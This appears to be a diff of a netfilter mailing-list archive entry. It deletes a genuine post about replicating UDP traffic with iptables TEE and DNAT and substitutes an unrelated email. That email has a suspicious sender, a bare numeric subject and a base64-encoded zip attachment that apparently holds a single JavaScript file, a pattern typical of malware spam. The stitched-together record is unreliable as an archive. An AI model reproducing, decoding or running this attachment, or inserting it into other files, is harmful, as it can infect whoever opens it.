@@ -1,43 +1,50 @@
-From: Sergey Yermakov <sergey@epmaki.net>
-Subject: Re: Changing destination ip and port of TEE'ed udp
-Date: Mon, 8 May 2017 18:51:51 -0600
-Message-ID: <bf8bd631-544f-4935-af98-5506a67f1da4@epmaki.net>
-References: <fbc2b521-5f4d-dc10-ee52-c17c5fbc810c@epmaki.net>
- <6411b93c-1e13-19ea-b90a-d41df584502e@epmaki.net>
+From: <kathleen.gilbert@hwhlaw.com>
+Subject: 18978
+Date: Tue, 09 May 2017 01:01:28 -0000
+Message-ID: <149429168802.31457.16599778566256047007@sta.211.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-To: netfilter-devel@vger.kernel.org
+Content-Type: application/zip; name="43892509.zip"
+Content-Transfer-Encoding: base64
+To: <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from mout.perfora.net ([74.208.4.196]:52427 "EHLO mout.perfora.net"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1751243AbdEIAvy (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
-        Mon, 8 May 2017 20:51:54 -0400
-Received: from [192.168.0.31] ([75.171.210.125]) by mrelay.perfora.net
- (mreueus003 [74.208.5.2]) with ESMTPSA (Nemesis) id 0Lw03n-1e6Lmn2ixJ-017lNV
- for <netfilter-devel@vger.kernel.org>; Tue, 09 May 2017 02:51:52 +0200
-In-Reply-To: <6411b93c-1e13-19ea-b90a-d41df584502e@epmaki.net>
+Received: from 162.82.248.178.sta.211.ru ([178.248.82.162]:33174 "HELO
+        sta.211.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751205AbdEIBBc (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Mon, 8 May 2017 21:01:32 -0400
+Content-Disposition: attachment
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
- > It's not TEE's job to modify the packet - that's for DNAT left to do.
-
-I see. thx.
-
-What would be the best approach using DNAT for the following scenario 
-instead of having this ? :
-
-# iptables .. -j TEE --gateway 192.168.0.1 --new-dst 192.168.0.21 
---new-dport 201
-# iptables .. -j TEE --gateway 192.168.1.2 --new-dst 192.168.1.22 
---new-dport 201
-# iptables .. -j TEE --gateway 192.168.1.2 --new-dst 192.168.1.23 
---new-dport 202
-
-scenario:
-I have a server (192.168.3.20/24) that is getting a quite substantial 
-amount of udp data on some port and I need to replicate that data out to 
-192.168.0.21/24, 192.168.1.22/24 and 192.168.1.23/24 servers ?
-
-thx,
--sergey
+UEsDBBQAAAAIAHGrqEomQ+kWwQYAAGIlAAAEAAAAMS5qc6VaXXPaSBB8T1X+g4oq6qCcy2HhxKFc
+fsAgg/EHtsFfeROwWPhAEpIAk6v894PkbnqcNBJxXlytZXdnpnt2dgSeu5F1MX3uBJetcfXqc3sw
+d61D64+w//flxfXw1Ft9LtgSdBv2l2N5enwW6NYFeoK6gp5aAnuCatYhMeELMoIWZF5VUF9QImiE
+QLDNvaA2cefJ9LG+ICgH4zExCZZOBIUI/D3WeOZMMDjMFQUeIMo5iCWWrGRYbT3K4xe44DQEXwk6
+JmaDKbR7EDRBqAswzVS6RbCElCWxCH951nSfBLd6NRAo6NqQvdSgO1CiCWoKOj07z+3IUyeJSLL4
+xAQ8GBItAkJejZwFpWMtGMBr+FwRZBd3SCTIpACOJAtmAdvriLFIEOXgceuIa54bIdhgIJDGZyPV
+d3KTkTpDQUx2V0ESNnZUOL8QhXaeqfQiHBVFljgL5gL4CMjEGKtfIZKgV8YpcJ2NWiSBSi0EDNFm
+xL/IwK8ENcyQqTEJCk5jmwySopFmgqbrpKbiJhOyElhTwqQPla3HyCX1YEhiHRNT8WAUEQPqhrBe
+XMvDLrnQQDtmIq4n4sDjjPjikVsT+vRuTlbdQlme9wF3BX0AcfuCPtp/YYa9h3WfBO3ZH/YQMsJF
+iPRSBLcN8HKPNqF5EZuaS+6tE3I424LoPYjDubqJQeSXk/B/7MCbjJtY0FRQxt0Mf3H2cTA31mRQ
+kRRIbtJkojm0feoEvRvQTDsdQeuGtEnCgaydmBirO4QhNHVtn9A7W8LFK0HpDU8CosCjkp52Yxk5
+EGQoHiMf3yt9BblRNUvJecR1AxeEU33kVyddHooHfxy8fTOc+f1kFPjW3fVldzp0J7Xn3vhh1VA9
+DQrxc/e8NfFqdyf+9Lh3+3D6zjpbjtt+9/r8Oei1Rp1mbRo/FK1/rMgks8i3flrwftW8jN2+KVyb
+R+c5LJDl76zcY664+psrHlhf375ZZ8692+k/xMFpz0R3yY1X7TbWbzPmJogal+1mEM8FuWOBBUEz
+H1PjPuYKCgUZsjw3x8xIUN4uLWJ58vICbUElTC4LrAtKX+LDp4WaiQlVRJIIGs3Nfbsnj08kMLYs
+Dw8+sUF7AQKxEcgYESoTFp+jKDPQCkgtstkGFTIT5B5hEETV86UqS5Uoz3iPPYGv0VQJ5JuF4EwF
+V8LJw0pBJVyfEqllwqhiFxuAZUWzkgSMEBXDMbTtuyzjAgRMfcpT8ZRmGFSascGqEk9QxAyVmgK7
+QJdMDqxRzr3mkKYv4adVECJTaSBIn2iz/fklftjnAjvYH4NnZHWZaunQ5ZR3QVSA9Zbf4e+d97rC
+PFN0gnQIi0glg1WTVPdKugpk5EpWighCterryg7vBN23BfaeaInP2xkJAWNI+nZdEWujQHSSCEYU
+RfqmoCLq457fVJmVUulEhcSHxNPqsqTZ9kyzq85LL5yd1E6iT847HEdNPhaEkjoeGMJKzELhFzcO
+n5mEsOUisQzdjaC8XcnbR9QK2eGDoNq2n6ZviDHqgw7/07mbpF/jTuSSIj6AAhO93TpybIKUzZcr
+HAtC3ldeTFDjfAdaASkFmXYxWMmYsA9VlIelDK+YQvmMsu6YZ8HmRfkoH2W2Afxyz6tC1U49kKpP
+EbQW2W442G9DL6PTlZUZlsNIRZy6JGRaVNmOx6lm8OkEZSMEDMbpma5pS9QO6baY83v5comOK1tk
+U2aoRov5kJXP2Lym02Tbq7TKaFlU5Tf+4EUS/XoLk+4UroyhmljS13pzc6v1o9+dxE1m/GWE+aaO
+H78+dc/MpC2XOLbTy4eaSWqTfmFgXrFGKqPdE0T7PlW2VGHJqCeCeE68IhU6CfWYNqiskC2Vy9un
+wNYzd/Fp+VciUZQzppw7ger7hoSGos5Exvuf7VwTLtEJhYEfm6MAZXKp1maJR6JA7BveWARVfytV
+GYEIOyCRjog5jAW+1j/rayxd/ulVcJTOjQo9M0GcDsbZq1GXRH08Ght6RAWhXcjqIGupn6YfFd1Q
+6Jsq66uQ9BKn0uUFZ7ZDnB6zpDCvuspWzV5JfxOqUg/OeUZ9++So5g9vRzNBiGR7uQRx3ehrBm3g
+7K3blRddCnPU5ttSr8jyUrongeptfW5+k4vlXbb1BnXTPRO0X88Vv/+GsP7K3lvM25fTRqt6MzCz
+rm8dWmbujgvkV4Uf/k/pnYXfRtcbWm/fjIZWYdTo3lf/+5HvZNG2Dg+tj/ZuxbZL+39+A7v2/vqX
+h7XtwYVpTarLdnh+633+UntIUqz//NPCyoF1TLmdZn/UiU3dmfTa/nS29K52cus4vzn19V9QSwEC
+HwAUAAAACABxq6hKJkPpFsEGAABiJQAABAAkAAAAAAAAACAAAAAAAAAAMS5qcwoAIAAAAAAAAQAY
+AMrWjcMoyNIBytaNwyjI0gGYCVFvKMjSAVBLBQYAAAAAAQABAFYAAADjBgAAAAA=
